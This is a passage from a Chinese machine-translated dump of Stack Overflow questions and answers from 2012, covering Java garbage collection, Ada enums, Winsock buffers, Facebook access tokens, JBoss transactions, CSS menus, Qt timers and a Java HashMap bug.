         Vector v1=new Vector();
         Vector v2=new Vector();
        String str="Hello";

        for (long i = 0L; i < 999999L; i++) {
            v.add(str + i);
            v1.add(str + i);
            v2.add(str + i);
        }
        v=null;
        v1=null;
        v2=null;
 }

private void startGC()
{
    System.gc();
} 
```

**我的问题：**

1）为什么垃圾收集在这个例子中不起作用。

2）如何让JVM垃圾收集所有未使用的内存块。

**任何实现相同的代码示例。**

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-25T14:17:47.530

1.  它以什么方式不起作用？
2.  您不能*告诉*JVM 启动垃圾收集，您只能通过调用 System.gc()*建议*您认为这是一个好主意。

从[JavaDoc](http://docs.oracle.com/javase/6/docs/api/java/lang/System.html#gc%28%29)：

*调用 gc 方法表明 Java 虚拟机花费精力回收未使用的对象，以使它们当前占用的内存可用于快速重用。当控制从方法调用返回时，Java 虚拟机已尽最大努力从所有丢弃的对象中回收空间。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:25:30.037

如果我尝试

```
private static void insert() {
    List<String> v1 = new ArrayList<>(), v2 = new ArrayList<>(), v3 = new ArrayList<>();
    String str = "Hello";

    for (long i = 0L; i <= 999999; i++) {
        v1.add(str + i);
        v2.add(str + i);
        v3.add(str + i);
    }
}

private static void startGC() {
    System.gc();
}

private static long mbUsed() {
    return (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory())/1024/1024;
}

public static void main(String... args)  {
    startGC();
    System.out.printf("Memory used before insert %,d MB%n", mbUsed());
    insert();
    System.out.printf("Memory used after insert %,d MB%n", mbUsed());
    startGC();
    System.out.printf("Memory used after GC %,d MB%n", mbUsed());
} 
```

它打印

```
Memory used before insert 2 MB
Memory used after insert 265 MB
Memory used after GC 5 MB 
```

所以它似乎对我有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:20:10.343

[这](http://javarevisited.blogspot.pt/2011/04/garbage-collection-in-java.html)是一本关于 Java 垃圾收集的好读物。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-25T14:25:52.843

您不能强制收集，这是错误的方法。您应该阅读可以传递给 JVM 的不同的垃圾收集参数，并选择可以最大化您感兴趣的性能的参数（总体吞吐量？最小暂停？等）。代码本身不应该真正担心 gc。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-25T14:33:35.447

如前所述，您只能建议 GC 删除您的对象。您唯一可能做的就是设置 heapmax（例如：-Xmx512m）。您可以通过这种方式影响 gc 的运行。这可能是 Java 的最大缺点之一。如果你真的需要堆，你必须使用像 cpp 这样的语言，它不会使用 vm 来编译应用程序。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-25T14:40:05.907

JVM 正在回收它已分配的内存。

没有必要将其交还给操作系统。

请看一下这篇文章[Java 在释放对象和垃圾收集后仍然使用系统内存](https://stackoverflow.com/questions/324499/java-still-uses-system-memory-after-deallocation-of-objects-and-garbage-collecti)，解释了它是如何工作的。

# python - 在 Python 中调用 Inkscape

> ID：11651826
> 
> 赞同：9
> 
> 时间：2012-07-25T14:16:35.190
> 
> 标签：python, pdf, svg, inkscape

> **可能重复：**
> [在 Python 中调用外部命令](https://stackoverflow.com/questions/89228/calling-an-external-command-in-python)

我正在尝试将 SVG 文件转换为 Python 中的 PDF。我想为此使用 Inkscape。如何在 Python 中调用 Inkscape？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T14:19:22.883

如果您根本不需要与进程通信，这应该就可以了：

```
import subprocess
p=subprocess.call(['program','arg1','arg2','arg3', ...]) 
```

# ember.js - EmberJS：我的应用程序已经初始化到路由器后，如何添加特定的控制器？

> ID：11651827
> 
> 赞同：1
> 
> 时间：2012-07-25T14:16:39.090
> 
> 标签：ember.js

实际上，我们尝试使用 EmberJs 框架构建一个模块化的 Web 应用程序。在启动时，我们希望加载具有所有核心功能的应用程序......如果用户与应用程序交互，我们希望将几个 ember-widgets 重新加载到应用程序中，并带有自己的视图和控制器。我的问题是，如何将重新加载的控制器和视图注入应用程序？

我尝试以下：

```
App.getPath('router.applicationController.controllers').reopen({
    aController   : this.AController.create()
}); 
```

但这似乎行不通，因为控制器没有像我认为的那样注入。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-26T16:54:33.767

好消息：您的目标（在启动时加载核心 fx 并在用户与应用程序交互时重新加载视图/控制器）对于大多数 ember 应用程序是常见的。坏消息：它并不像您期望的那样工作，您可能需要进行一些重构。

初始化路由器时，它将创建命名空间中定义的每个控制器类的单例实例。控制器实例应该是长期存在的，并且应该是轻量级的以实例化。当然，他们不应该在 init() 或类似的东西中加载数据。

当用户导航到应用程序中的各种路由时，使用 connectOutlets() 在控制器上设置适当的数据并将它们绑定到视图。Ember 将根据需要自动创建/销毁视图类的实例。所以基本上你在重新加载控制器时想要做的任何事情都应该在这里发生。有关其工作原理的更多详细信息，我建议您查看 router.js 源中的“注入控制器单例”部分：[https ://github.com/emberjs/ember.js/blob/master/packages/ ember-routing/lib/router.js#L295](https://github.com/emberjs/ember.js/blob/master/packages/ember-routing/lib/router.js#L295)

如果您遵循上述方法，您的应用程序将满足规定的设计目标，而无需将控制器实例注入路由器。

说得通？

# enums - 在 Ada 中扩展枚举

> ID：11651828
> 
> 赞同：6
> 
> 时间：2012-07-25T14:16:42.193
> 
> 标签：enums, ada

是否可以在 Ada 中扩展 Enum 类型？如果我有例如：

```
type ABC_Type is (A, B, C); 
```

现在我想要新的类型 ABCDE_Type，它将包括 ABC_Type 拥有的所有内容以及（D，E）。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-25T14:37:23.447

不，您不能在 Ada 中扩展 Enum 类型，您只能创建涵盖原始子集的派生/子类型。

你必须反过来做：

```
type ABCDE_Type is (A, B, C, D, E);
type ABC_Type is new ABCDE_Type range A .. C;
-- or
subtype ABC_Type is ABCDE_Type range A .. C; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-29T21:19:10.610

一个人给出的答案是正确的；您不能扩展枚举（或数字）类型。但是，您**可以**使用 Yony 的 Animal/Fox 示例扩展标记类型，我已将其翻译成 Ada 的 OO 模型：

```
-- Percent defines an integer-value between zero and one-hundred, inclusive.
Subtype Percent is Natural Range 0..100;

-- Attribute defines an integer between one and ten, inclusive.
Subtype Attribute is Positive Range 1..10;

-- Animal, the base object-class.
Type Animal is Abstract Tagged Record
-- All Animals have a survivability attribute.
Survivability : Percent:= Percent'Last; -- Default "survivability" to Max.
End Record;

-----------------------------------------------------
-- Declaration of Primitive Operations for Animal. --
-----------------------------------------------------

-- Name; returns the name of the type of the animal.
Function Name( Object : In Animal'Class ) Return String;

-------------------------------------------------------
-- Implementation of Primitive Operations for Animal --
-------------------------------------------------------

Function Name( Object : In Animal'Class ) Return String is
Use Ada.Tags;
begin
    -- This is implementation dependent; with the compiler I'm using the Uppercased 
    -- type-name of the actual object will be returned.
Return External_Tag(Object'Tag);
end Name;

---------------------------
-- The Fox object-class. --
---------------------------
Type Fox is New Animal with record
Cunning : Attribute:= Attribute'First;
end record; 
```

事实上，扩展（OO 继承）和排除（子类型化）都可以在同一个程序中使用，并且同一个子程序对一个类型进行操作。

```
package Windowing is
Type Window is tagged private;

-- Pointers for windows.
Type Window_Pointer is Access Window'Class; -- Normal pointer
Subtype Handle is Not Null Window_Pointer;  -- Pointer with Null excluded.

-- A light 'vector' of handles.
Type Window_List is Array (Positive Range <>) of Handle;

-- Primitive operations
Function Get_Child_Windows( Object : In Handle ) Return Window_List;
Procedure Set_Window_Height( Object : In Handle; Height : In Positive );
Function  Get_Window_Height( Object : In Handle ) Return Positive;

-- more primitive operations... including subprograms to create windows 
    -- and perhaps assign them as children.

Private
Package Win_Vectors is new
  Ada.Containers.Vectors(Index_Type => Positive, Element_Type => Handle);

Type Window is Tagged Record
    -- X & Y may be negative, or zero.
    X, Y        : Integer:= Positive'First;
    -- Height & Width must be positive.
    Height, Width   : Positive:=    Positive'First;
    -- Child-list
    Children        : Win_Vectors.Vector:= Win_Vectors.Empty_Vector;
End Record;

End Windowing;

package body Windowing is
Procedure Set_Window_Height( Object : In Handle; Height : In Positive ) is
begin
    Object.Height:= Set_Window_Height.Height;
end Set_Window_Height;

Function  Get_Window_Height( Object : In Handle ) Return Positive is
begin
    Return Object.Height;
end Get_Window_Height;

Function Get_Child_Windows ( Object : In Handle ) Return Window_List is
begin
    -- Return a null-array if there are no child windows.
    if Object.Children.Is_Empty then
      Return (2..1 => Object);
    end if;

    -- Create an array of the proper size, then initialize to self-referential
    -- handle to avoid null-exclusion error.
    Return Result : Window_List( 1..Positive(Object.Children.Length) ):= 
         (others => Object) do
    Declare
         Procedure Assign_Handle(Position : Win_Vectors.Cursor) is
          Use Win_Vectors;
          Index : Positive:= To_Index( Position );
         begin
          Result(Index):= Element(Position);
         end Assign_Handle;
    Begin
         -- Replace the self-referential handles with the correct ones.
         Object.Children.Iterate( Process => Assign_Handle'Access );
    End;
    End Return;
end Get_Child_Windows;

end Windowing; 
```

子类型本身可以是一个强大的概念。事实上，在对数学建模时，Ada 的子类型可以让函数完全匹配它们的数学定义，或者以某些检查完全不需要的方式实现事物。

```
-- Remove non-normal representations.
Subtype Real is Float Range Float'Range;

-- Constrain to non-negative numbers.
Subtype Natural_Real is Real Range 0.0 .. Real'Last; 

-- Because of the parameter-type, we do not need to implement any checks
-- for negative numbers in the subprogram body.
Function Square_Root( X : In Natural_Real ) Return Natural_Real;

-- Because Divisor is positive, we need not worry about ddivide-by-zero.
Function Good_Divide( Quotient: Integer; Divisor: Positive ) Return Natural; 
```

# c++ - WSARecv 一次可以接收的最大字节数是多少？

> ID：11651829
> 
> 赞同：2
> 
> 时间：2012-07-25T14:16:44.693
> 
> 标签：c++, sockets, winsock2, iocp

我正在使用 std::vector 来表示每个 IO 数据结构中的缓冲区：

```
struct PerIoData 
{
    WSAOVERLAPPED m_overlapped;
    SOCKET m_socket;
    WSABUF m_wsaBuf;
    std::vector<BYTE> m_vecBuffer;
    DWORD m_dwFlags;
    DWORD m_dwNumberOfBytesSent;
    DWORD m_dwNumberOfBytesToSend;
    eOperationType m_operationType;
};

...
...
if (WSARecv(pPerIoData->m_socket, &(pPerIoData->m_wsaBuf), 1, &dwNumberOfBytesReceived, &(pPerIoData->m_dwFlags), &(pPerIoData->m_overlapped), NULL) == 0)
    continue; 
```

我想在调用 WSARecv() 后指定最大大小并在 m_vecBuffer 上执行“缩小以适应”。

我已经查看了[此页面](http://msdn.microsoft.com/en-us/library/windows/desktop/ms741688%28v=vs.85%29.aspx)，但无法找到我正在寻找的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T20:02:41.927

`WSABUF`您传递给的结构`WSARecv()`指定了一个指向缓冲区的指针，该缓冲区`WSARecv()`将字节读入，以及可以读入该缓冲区的最大字节数。完成`WSARecv()`工作后，它会报告实际读入缓冲区的字节数。如果将`vector`用作缓冲区，则必须将向量预分配为所需的最大大小，然后设置`WSABUF::buf`为指向向量的内部存储器，设置`WSABUF::len`为向量的分配大小，然后将向量的大小调整为新的值`WSARecv()`报告。

# facebook - 如何获得访问我的 Facebook 页面之一的令牌

> ID：11651838
> 
> 赞同：1
> 
> 时间：2012-07-25T14:17:05.177
> 
> 标签：facebook, facebook-fql, facebook-authentication

所以这是交易，我正在学习如何使用 facebook api，我在尝试理解它时遇到了一些困难，文档根本没有组织*imho*。

所以我收到此错误“模拟访问令牌只能与 Graph API 一起使用”

我认为这是因为我从图形 API 资源管理器中复制了令牌。

我对这个项目的主要目的是建立一个正常的网站，它可以获取我的 facebook 页面（专辑、照片和活动）的一些数据，并将其作为页面内容显示在网站上。就像 facebook 页面是后台一样。

我该如何解决这个问题？

这是我想要完成的一个真实示例：http: [//codecanyon.net/item/facebook-album-gallery/full_screen_preview/400462](http://codecanyon.net/item/facebook-album-gallery/full_screen_preview/400462)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T15:19:31.857

我同意 FB 文档会很好......“无组织”。

无论如何，获取访问令牌都需要几个步骤。从 FB 资源管理器复制是行不通的。

1.  注册一个 FB 应用程序
2.  使用 FB 应用 ID 和密钥创建一个 .php 页面（例如），让用户授予您特别请求的权限
3.  当用户完成权限请求时，FB 会将用户重定向到您指定的回调，并在 URL 后附加 access_token
4.  解析该令牌，并将其存储在某处
5.  使用该 access_token 从您想要的 API 中获取数据
6.  如果 access_token 是永久的，那么您可以稍后使用存储的令牌来离线获取更多数据。

我将示例代码修改如下，以创建应用程序权限抓取器：

```
$app_id = "myappid";
$app_secret = "mysecret";
$my_url = "http://mycallbackurl";
session_start();
$code = $_REQUEST["code"];
(empty($code)) {
 $_SESSION['state'] = md5(uniqid(rand(), TRUE)); //CSRF protection
 $dialog_url = "https://www.facebook.com/dialog/oauth?client_id="
   . $app_id . "&redirect_uri=" . $my_url 
   . "&scope=offline_access,manage_pages,read_stream,read_insights,export_stream,read_friendlists";

  }else{

  $token_url = "https://graph.facebook.com/oauth/access_token?"
   . "client_id=" . $app_id . "&redirect_uri=" . urlencode($my_url)
   . "&client_secret=" . $app_secret . "&code=" . $code;

  $response = file_get_contents($token_url);
  $params = null;
  parse_str($response, $params);

  $graph_url = "https://graph.facebook.com/me?access_token="
   . $params['access_token'];

 $user = json_decode(file_get_contents($graph_url));
 $at = $params['access_token'];
 $uid = $user->id;
 $un = $user->name;

 ...and so on 
```

# jdbc - 使用 jdbc 回滚 JBoss 事务

> ID：11651839
> 
> 赞同：0
> 
> 时间：2012-07-25T14:17:05.500
> 
> 标签：jdbc, jboss, transactions

我使用 JBoss 4.0.4 GA 作为应用服务器，使用 EJB 2.x 作为编码逻辑，使用 Mysql 5.1 作为后端。我最近将jboss 配置中的**commit-option更改为****"B"**，因为我们在 EJB 中引入了一些 JDBC 查询。我的 EJB 代码反过来调用 MySql 中的存储过程，我使用 CallableStatement 来执行存储过程。我在 MySQL 中为表使用 Innodb 引擎，而 jboss 数据源是最简单的配置，它使用 . 但是当我通过客户端执行 EJB 方法时，我得到以下异常：

> 引起：org.jboss.resource.connectionmanager.JBossLocalXAException：无法提交本地tx；- 嵌套 throwable: (org.jboss.resource.JBossResourceException: SQLException; - 嵌套 throwable: (java.sql.SQLException: 连接关闭后不允许操作。)) 在 org.jboss.resource.connectionmanager.TxConnectionManager$LocalXAResource.commit( TxConnectionManager.java:912) 在 org.jboss.tm.TransactionImpl$Resource.commit(TransactionImpl.java:2253) 在 org.jboss.tm.TransactionImpl.commitResources(TransactionImpl.java:1784) 在 org.jboss.tm.TransactionImpl .commit(TransactionImpl.java:340) ... 29 更多
> 
> 引起：org.jboss.resource.JBossResourceException：SQLException；- 嵌套的 throwable：（java.sql.SQLException：连接关闭后不允许操作。）在 org.jboss.resource.adapter.jdbc.BaseWrapperManagedConnection.checkException(BaseWrapperManagedConnection.java:636) 在 org.jboss.resource.adapter.jdbc .local.LocalManagedConnection.commit(LocalManagedConnection.java:73) at org.jboss.resource.connectionmanager.TxConnectionManager$LocalXAResource.commit(TxConnectionManager.java:905) ... 32 更多
> 
> 原因：java.sql.SQLException：连接关闭后不允许任何操作。在 com.mysql.jdbc.Connection.checkClosed(Connection.java:1842) 在 com.mysql.jdbc.Connection.commit(Connection.java:2154) 在 org.jboss.resource.adapter.jdbc.local.LocalManagedConnection.commit (LocalManagedConnection.java:69) ... 33 更多

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T09:33:31.077

我解决了这个问题，这是存储过程权限的问题。数据源配置了对存储过程没有权限的用户。在使用正确的权限进行测试后，代码正在运行并且交易正常。我尝试使用正常的 JDBC 连接 [不使用数据源] 执行存储过程。这一步给了我空指针异常，通过它我了解了访问权限。

我没有在上一篇文章中提交的异常“The null”的长堆栈跟踪中有一个线索，但对我来说，上面建议与数据源连接相同。感谢任何试图提供帮助的人。我希望这可能是其他人的未来，对我来说是一个奇怪的错误。

```
org.jboss.tm.JBossTransactionRolledbackException: ***null***; nested exception is: 
org.jboss.tm.JBossRollbackException: Unable to commit, tx=TransactionImpl:XidImpl[FormatId=257, GlobalId=serverip/13308, BranchQual=, localId=13308] status=STATUS_NO_TRANSACTION; - nested throwable: (org.jboss.resource.connectionmanager.JBossLocalXAException: could not commit local tx; - nested throwable: (org.jboss.resource.JBossResourceException: SQLException; - nested throwable: (java.sql.SQLException: No operations allowed after connection closed.))); - nested throwable: (org.jboss.tm.JBossRollbackException: Unable to commit, tx=TransactionImpl:XidImpl[FormatId=257, GlobalId=serverip/13308, BranchQual=, localId=13308] status=STATUS_NO_TRANSACTION; - nested throwable: (org.jboss.resource.connectionmanager.JBossLocalXAException: could not commit local tx; - nested throwable: (org.jboss.resource.JBossResourceException: SQLException; - nested throwable: (java.sql.SQLException: No operations allowed after connection closed.)))) 
at org.jboss.ejb.plugins.TxInterceptorCMT.throwJBossException(TxInterceptorCMT.java:569) 
at org.jboss.ejb.plugins.TxInterceptorCMT.endTransaction(TxInterceptorCMT.java:506) 
at org.jboss.ejb.plugins.TxInterceptorCMT.runWithTransactions(TxInterceptorCMT.java:361) 
at org.jboss.ejb.plugins.TxInterceptorCMT.invoke(TxInterceptorCMT.java:181) 
at org.jboss.ejb.plugins.SecurityInterceptor.invoke(SecurityInterceptor.java:168) 
at org.jboss.ejb.plugins.LogInterceptor.invoke(LogInterceptor.java:205) 
at org.jboss.ejb.plugins.ProxyFactoryFinderInterceptor.invoke(ProxyFactoryFinderInterceptor.java:136) 
at org.jboss.ejb.SessionContainer.internalInvoke(SessionContainer.java:648) 
at org.jboss.ejb.Container.invoke(Container.java:954) 
at sun.reflect.GeneratedMethodAccessor109.invoke(Unknown Source) 
at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
at java.lang.reflect.Method.invoke(Unknown Source) 
at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155) 
at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94) 
at org.jboss.mx.server.Invocation.invoke(Invocation.java:86) 
at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264) 
at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659) 
at org.jboss.invocation.jrmp.server.JRMPInvoker$MBeanServerAction.invoke(JRMPInvoker.java:819) 
at org.jboss.invocation.jrmp.server.JRMPInvoker.invoke(JRMPInvoker.java:420) 
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
at java.lang.reflect.Method.invoke(Unknown Source) 
at sun.rmi.server.UnicastServerRef.dispatch(Unknown Source) 
at sun.rmi.transport.Transport$1.run(Unknown Source) 
at java.security.AccessController.doPrivileged(Native Method) 
at sun.rmi.transport.Transport.serviceCall(Unknown Source) 
at sun.rmi.transport.tcp.TCPTransport.handleMessages(Unknown Source) 
at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(Unknown Source) 
at java.lang.Thread.run(Unknown Source) 
```

# jquery - CSS/Jquery 垂直菜单，子菜单项的位置固定

> ID：11651840
> 
> 赞同：0
> 
> 时间：2012-07-25T14:17:08.823
> 
> 标签：jquery, css, layout, menu

i have to design a full width page with the main_menu is on the starting left of the page..now each menu has different options which are to be shown when any item from the main_menu is selected, but in a div fixed for options.. .例如

![布局](../Images/4a978c4126d47e56d300515a030363af.png)

即，每当有人从主菜单中选择一个 menu_item 时，相关的选项都应该放在选项容器内...

我怎样才能做到这一点？？这可以仅使用 css 完成吗？还是我需要为此使用jquery？

更新---在这里查看//// [http://jsfiddle.net/ybfrH/](http://jsfiddle.net/ybfrH/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T17:08:39.817

## 纯 CSS3 解决方案

如果您想支持较旧的浏览器，这是不切实际的，因为它使用选择器（这也意味着您在单击主菜单时`:target`正在更改字符串）。`url`

[**见小提琴**](http://jsfiddle.net/ZEHpr/4/)。

**鉴于此 HTML**

```
<div id="main-menu">
    <div class="center">
        <a id="p1" href="#opt1">Item 1</a>
        <a id="p2" href="#opt2">Item 2</a>
        <a id="p3" href="#opt3">Item 3</a>
    </div>
</div>
<div id="submenu">
    <div class="options">
        <div id="opt1">
            <a id="s1" href="#">Sub Item 1</a>
            <a id="s2" href="#">Sub Item 2</a>
            <a id="s3" href="#">Sub Item 3</a>
        </div>    
        <div id="opt2">
            <a id="s4" href="#">Sub Item 4</a>
            <a id="s5" href="#">Sub Item 5</a>
            <a id="s6" href="#">Sub Item 6</a>
        </div>        
        <div id="opt3">
            <a id="s7" href="#">Sub Item 7</a>
            <a id="s8" href="#">Sub Item 8</a>
            <a id="s9" href="#">Sub Item 9</a>
        </div>
    </div>
</div>
<div id="application_area">
    <div id="header"></div>
</div> 
```

**这个 CSS 做到**了（***子菜单在页面加载***时最初是空的——如果需要，请参见下文）

```
#submenu .options a {display: block;}
#submenu .options > div {display: none}

#submenu .options > div:target {
    display: block;
} 
```

**在页面加载时显示选项 1**

首先，将`#opt1`div 移动到 的***最后一个*** `div`，`.options`然后使用下面的 CSS 而不是上面给出的（[**参见小提琴**](http://jsfiddle.net/ZEHpr/11/)）：

```
#submenu .options a {display: block;}
.options > div:not(#opt1) {display: none}
.options > :target ~ #opt1 {display: none;}

#submenu .options > div:target {
    display: block;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T15:27:33.887

您可以使用 jquery 来做到这一点（我相信有更好的方法可以做到这一点，但这里是一种方法） [小提琴链接在这里](http://jsfiddle.net/jathin/ZEHpr/)，

```
<body>

    <div id="main-menu">
        <div class="center">
            <p id="p1">Item 1</p>
            <p id="p2">Item 2</p>
            <p id="p3">Item 3</p>
             </div>
             </div>
            <div id="submenu">
            <div class="options">
           </div>
           </div>

 <script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>

    <script type="text/javascript">

     var opt = '<a href="#">Item 1</a></br>'+'<a href="#">Item 2</a></br>'+'<a  href="#">Item 3</a>';

     var opt2 = '<a href="#">Item 4</a></br>'+'<a href="#">Item 5</a></br>'+'<a href="#">Item 6</a>';

     var opt3 = '<a href="#">Item 7</a></br>'+'<a href="#">Item 8</a></br>'+'<a href="#">Item 9</a>';

        $("#p1").click(function(){

          $('.options').html(opt);

          });

       $("#p2").click(function(){

          $('.options').html(opt2);

          });

        $("#p3").click(function(){

          $('.options').html(opt3);

        });

    </script>

        </body> 
```

# facebook - Drupal 表单 API Facebook 登录

> ID：11651843
> 
> 赞同：0
> 
> 时间：2012-07-25T14:17:18.480
> 
> 标签：facebook, drupal-7, drupal-fapi

我的 Drupal 实例上安装了 Facebook for Drupal。我的应用程序和一切工作正常。我想让它成为我的自定义内容类型之一，需要 Facebook 登录才能提交。我可以使用 hook_form_alter() 来做到这一点吗？这将适用于匿名用户。我希望他们看到内容类型（他们已经可以看到），但是一旦他们填写了字段并点击提交，表单将要求他们通过 Facebook 登录。我应该使用那个钩子还是可以用另一种方式来完成这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T15:36:12.623

我发现 Drupal for Facebook 模块具有用户管理功能，允许我自动为通过 Facebook 身份验证的任何用户分配临时角色。我添加了一个角色并更改了权限以允许发布我的自定义内容类型。现在一切正常！希望这对某人有帮助！

# qt - 如何使用 QTimer

> ID：11651852
> 
> 赞同：30
> 
> 时间：2012-07-25T14:17:43.223
> 
> 标签：qt, timer

在 Qt 中，我试图设置一个`QTimer`每秒调用一个名为“update”的函数。这是我的 .cpp 文件：

```
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QTimer>
#include "QDebug"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    QTimer *timer = new QTimer(this);
    connect(timer, SIGNAL(timeout()), this, SLOT(update()));
    timer->start(1000);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::update()
{
    qDebug() << "update";
} 
```

和主要的：

```
#include <QtGui/QApplication>
#include "mainwindow.h"

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;
    w.show();

    return a.exec();
} 
```

该项目正在构建，但它不执行更新，因为“更新”行没有显示在任何地方......有人看到我做错了什么吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-12-26T00:54:00.377

其他方法是使用内置方法启动计时器和事件 TimerEvent。

标题：

```
#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>

namespace Ui {
class MainWindow;
}

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    explicit MainWindow(QWidget *parent = 0);
    ~MainWindow();

private:
    Ui::MainWindow *ui;
    int timerId;

protected:
    void timerEvent(QTimerEvent *event);
};

#endif // MAINWINDOW_H 
```

资源：

```
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QDebug>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    timerId = startTimer(1000);
}

MainWindow::~MainWindow()
{
    killTimer(timerId);
    delete ui;
}

void MainWindow::timerEvent(QTimerEvent *event)
{
    qDebug() << "Update...";
} 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-07-25T14:28:14.497

1.  给父母一个`QTimer`使用 Qt 的内存管理系统的好习惯。

2.  `update()`是一个*QWidget*函数-这是您要调用的函数吗？[http://qt-project.org/doc/qt-4.8/qwidget.html#update](http://qt-project.org/doc/qt-4.8/qwidget.html#update)。

3.  如果数字 2 不适用，请确保您尝试触发的函数在标头中声明为插槽。

4.  最后，如果这些都不是您的问题，那么了解您是否遇到任何运行时连接错误会很有帮助。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2019-05-20T07:54:13.960

mytimer.h：

```
 #ifndef MYTIMER_H
    #define MYTIMER_H

    #include <QTimer>

    class MyTimer : public QObject
    {
        Q_OBJECT
    public:
        MyTimer();
        QTimer *timer;

    public slots:
        void MyTimerSlot();
    };

    #endif // MYTIME 
```

mytimer.cpp：

```
#include "mytimer.h"
#include <QDebug>

MyTimer::MyTimer()
{
    // create a timer
    timer = new QTimer(this);

    // setup signal and slot
    connect(timer, SIGNAL(timeout()),
          this, SLOT(MyTimerSlot()));

    // msec
    timer->start(1000);
}

void MyTimer::MyTimerSlot()
{
    qDebug() << "Timer...";
} 
```

主.cpp：

```
#include <QCoreApplication>
#include "mytimer.h"

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    // Create MyTimer instance
    // QTimer object will be created in the MyTimer constructor
    MyTimer timer;

    return a.exec();
} 
```

如果我们运行代码：

```
Timer...
Timer...
Timer...
Timer...
Timer...
... 
```

[资源](https://www.bogotobogo.com/Qt/Qt5_QTimer.php)

# java - 删除方法不删除 EmployeeStore 的员工

> ID：11651854
> 
> 赞同：0
> 
> 时间：2012-07-25T14:17:48.840
> 
> 标签：java, hashmap

我的删除方法似乎不起作用，因为当用户尝试输入员工姓名时，应用程序无法删除员工。应该发生的情况如下：

1.  用户使用我编写的名为 userInputByName 的方法输入员工的姓名。
2.  应用程序在商店中搜索该员工。
3.  员工被移除。

当我打印出员工仍然在那里的商店时，第 3 步不起作用。

我现在将向您展示我的代码。

```
MainApp()

//---------------------------------------------------------------------------------------
//  Name:        Case 3: Delete by Name.
//  Description: Choice 3 gives the user an option to delete an employee by name.
//---------------------------------------------------------------------------------------
            case 3:
                System.out.println("Delete by Name.");
                Employee employeeDelete = MenuMethods.userInputByName();
                Store.searchByName(employeeDelete.getEmployeeName());
                System.out.println("Your choice is: "+ employeeDelete);
                Store.remove(employeeDelete);
                break; 
```

员工

```
//---------------------------------------------------------------------------------------
//  Employee class.
//---------------------------------------------------------------------------------------
public class Employee
{
//---------------------------------------------------------------------------------------
//  Variables to be used in the employee store.
//---------------------------------------------------------------------------------------
    private String employeeName;
    private int employeeId;
    private String employeeEmail;
//---------------------------------------------------------------------------------------
//  Name:        Constructors.
//  Description:
//---------------------------------------------------------------------------------------
    public Employee(String employeeName, int employeeId, String employeeEmail) 
    {
        this.employeeName = employeeName;
        this.employeeId = employeeId;
        this.employeeEmail = employeeEmail;
    }
//---------------------------------------------------------------------------------------
//  Overloading the constructor for the use with userInputByName method.
//---------------------------------------------------------------------------------------
    public Employee(String employeeName) 
    {
        this.employeeName = employeeName;
    }
//---------------------------------------------------------------------------------------
//  Name:   Getters.
//---------------------------------------------------------------------------------------
    public String getEmployeeEmail() 
    {
        return employeeEmail;
    }

    public String getEmployeeName() 
    {
        return employeeName;
    }
    public int getEmployeeId() 
    {
        return employeeId;
    }
//---------------------------------------------------------------------------------------
//  Name:   Setters.
//---------------------------------------------------------------------------------------
    public void setEmployeeEmail(String employeeEmail) 
    {
        this.employeeEmail = employeeEmail;
    }
    public void setEmployeeName(String employeeName) 
    {
        this.employeeName = employeeName;
    }
    public void setEmployeeId(int employeeId)
    {
        this.employeeId = employeeId;
    }

//---------------------------------------------------------------------------------------
//  Name:   toString.
//---------------------------------------------------------------------------------------
    public String toString() 
    {
        return "\t\t\tEmployee\n" +
                "********************************************************************\n"+
                "Employee Name: "+ employeeName +"\n"+ 
                "Employee Id: " + employeeId +"\n"+  
                "Employee Email: " + employeeEmail;
    }
//---------------------------------------------------------------------------------------
} 
```

删除方法

```
public Employee remove(Employee key) {
        // Remove the Employee by name.
        if (map.containsKey(key))
            return map.remove(key); // if it is there remove and return.
        else
            return null; // if its not there return nothing.
    } 
```

哈希图声明

```
HashMap<String, Employee> map;
    private static Scanner keyboard = new Scanner(System.in);

    public EmployeeStore() {
        map = new HashMap<String, Employee 
```

按名称搜索

```
// ---------------------------------------------------------------------------------------
    // Name: Search by Name.
